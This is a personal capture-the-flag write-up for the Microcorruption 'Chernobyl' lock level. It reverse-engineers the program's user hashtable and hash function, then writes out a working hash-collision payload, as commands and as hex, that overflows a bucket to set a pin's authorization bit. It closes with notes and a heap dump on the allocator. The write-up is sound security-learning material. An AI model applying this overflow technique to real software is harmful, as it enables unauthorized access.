# Chernobyl #

- There is a hashtable of users
- There appear to be "commands" you can enter
  - 'access {name} {pin}' = "access" the lock
  - 'new {name} {pin};' = Create a new user (permission not granted by default)

Called with r15 = 3, r14 = 5
`<create_hash_table>`
r15 = max_entries
r14 = items per entry

r10 points at the table structure:
```c
struct table {
    __int16_t item_count;
    __int16_t items_per_bucket;
    __int16_t bucket_count;
    __int8_t *??; // = malloc(2^items_per_bucket)
    __int16_t *item_counts; // = malloc(max_entries * sizeof(__int16_t))
}
```
10 bytes

```c
struct table_entry {
    char name[16];
    union auth_and_pin {
        __int16_t authorized:1;
        __int16_t pin:15;
    }
}
```
18 bytes

example table at 0x5006
```asm
5000:   0050 1050 1500 0100 0300 0500 1650 2c50   .P.P.........P,P
5010:   0050 2650 2100 4250 a250 0251 6251 c251   .P&P!.BP.P.QbQ.Q
5020:   2252 8252 e252 1050 3c50 2100 0000 0000   "R.R.R.P<P!.....
5030:   0000 0100 0000 0000 0000 0000 2650 9c50   ............&P.P
5040:   b500 0000 0000 0000 0000 0000 0000 0000   ................
```

table entry (name = "bob", pin = 1)
```asm
5150:   0000 0000 0000 0000 0000 0000 fc50 bc51   .............P.Q
5160:   b500 626f 6200 0000 0000 0000 0000 0000   ..bob...........
5170:   0000 0100 0000 0000 0000 0000 0000 0000   ................
```

The high bit of the pin field is used to indicate authorization. There is an error message displayed if you specify a numeric value for the pin that has the high bit set.
Idea: need to understand how names are hashed, maybe we can make a collision that overwrites the top bit of a pin? Or maybe the entered user name is not checked for length?

Hash function, very much like usual implementations of `hashCode` when writing Java
```c
__int16_t hash(const char *value) {
    __int16_t result = 0;
    for (unsigned long i = 0; i < strlen(value); i++) {
        __int16_t c = (__int16_t) value[i];
        result = (result + c) * 31;
    }
    return result;
}
```

When the number of entries grows to a certain size, then the table is grown and the items are re-hashed into the new table;

The fact that you can input multiple commands separated by a semi-colon ';' just seems extraneous or maybe even a hint that you're going to put in a lot of accounts to get it to re-hash and then do something after the re-hash. I did see blocks returned by calls to `malloc` that had been used before and freed during a re-hash. The block's data remains intact, but I didn't see how I could use that since it was mostly the 5 18 byte table entry allocations. If they had been aligned a little differently and you could have left behind a lot of bits set and then entered an account name that hashed to that spot, maybe you could have gotten the high bit of the "pin" to have been set by previous contents, but the blocks came back aligned the same way as first time they were used.

Input at sp = 0x3dec, could we just write 4634 bytes of input + fake table data? No, call to `getsn` has it read 0x550 (1360) bytes

Could we try and add so many items that hash to the same bucket that it fills up the bucket? I'm still not totally clear on when the `rehash` call is decided.

From https://medium.com/@vaibhav0109/https-medium-com-vaibhav0109-java-hashcode-collision-how-uniform-is-its-distribution-ee4e5e8dc894

> If String a and String b have a common prefix and the same length — if n and the statement `31*(b[n-2] — a[n-2]) == (a[n-1] — b[n-1])` is true — it means that first and second strings have the same hashcode.

Bingo! If you keep adding accounts that hash to the same bucket, you can overflow the bucket of items.

So place an item in bucket `N`, and then overflow bucket `N-1` such that an item in bucket `N-1`'s `pin` falls on the address of data entered for bucket `N` where the high bit is set. You probably can't just overflow with any old values, because you'll also be overwriting the `name` field. So you have to overwrite with a valid name that would hash to that bucket.

`new abab 0;new bbabbbabbbaccac 1;new bbabbbabbbaddbd 2;new bbabbbabbbaeece 3;new bbabbbabbbaffdf 4;new bbabbbabbbaggeg 5;new bbabbbabbbahhfh 6;new bbabbbabbbaiigi 7`

the 6th item to overrun the preecding bucket overwrites the name with its 7th-16th bytes
the 7th item to overrun the preceding bucket overwrites the pin with its 7th and 8th bytes

entry @0x51c2, pin @51d2

`6e657720626f622010`

`new cb 0;new acb 1;new abcb 2;new aaabcb 3;new aaaaaaabcb 4;new aaaaaaaaabcb 5;new aaaaabcb 6;new ``````0x80 0x80 7;access cb 128`

```
6e657720636220303b
6e65772061636220313b
6e6577206162636220323b
6e65772061616162636220333b
6e6577206161616161616162636220343b
6e65772061616161616161616162636220353b
6e657720616161616162636220363b
6e65772060606060808020373b
61636365737320636220313238

6e657720636220303b6e65772061636220313b6e6577206162636220323b6e65772061616162636220333b6e6577206161616161616162636220343b6e65772061616161616161616162636220353b6e657720616161616162636220363b6e65772060606060808020373b616363657373206362203132383b
```

Well, that works, it results in the message "Access granted." but had I been reading the code a little more critically I would have noticed that that does not actually unlock the lock because nowhere in the code is there a call to the interrupt that does that. So where does that leave us? We must have to execute some of our own code to do it. I did go find some information from other folks who have beaten this level, just to see if there was something I'm missing, but I ended up finding out that just getting a user with access granted is not enough. I'm dissapointed because I felt like I really dove into this one and didn't want any hints, but oh well. I tried not to read any specific details, but from [this site](https://nullset.xyz/2015/12/18/microcorruption-ctf-chernobyl/) I came to realize we have to hijack the heap. Maybe I'll spend some time on that and post a part 2.

# 03/12/2021

Analyzing `malloc` and `free`

Heap header:
```c
struct block {
    __int16_t prev;
    __int16_t next;
    union size_and_used {
        __int16_t size:15;
        __int16_t used:1;
    }
}
```

Executing the `walk` function after `new bob 123`:

```
@5000 [alloc] [p 5000] [n 5010] [s 000a]
 {5006} [ 0001 0003 0005 5016 502c ]
@5010 [alloc] [p 5000] [n 5026] [s 0010]
 {5016} [ 5042 50a2 5102 5162 51c2 5222 5282 52e2 ]
@5026 [alloc] [p 5010] [n 503c] [s 0010]
 {502c} [ 0000 0000 0000 0001 0000 0000 0000 0000 ]
@503c [alloc] [p 5026] [n 509c] [s 005a]
 {5042} [ 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 ]
@509c [alloc] [p 503c] [n 50fc] [s 005a]
 {50a2} [ 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 ]
@50fc [alloc] [p 509c] [n 515c] [s 005a]
 {5102} [ 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 ]
@515c [alloc] [p 50fc] [n 51bc] [s 005a]
 {5162} [ 6f62 0062 0000 0000 0000 0000 0000 0000 007b 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 ]
@51bc [alloc] [p 515c] [n 521c] [s 005a]
 {51c2} [ 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 ]
@521c [alloc] [p 51bc] [n 527c] [s 005a]
 {5222} [ 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 ]
@527c [alloc] [p 521c] [n 52dc] [s 005a]
 {5282} [ 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 ]
@52dc [alloc] [p 527c] [n 533c] [s 005a]
 {52e2} [ 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 ]
@533c [freed] [p 52dc] [n 5000] [s 7cbe]
```
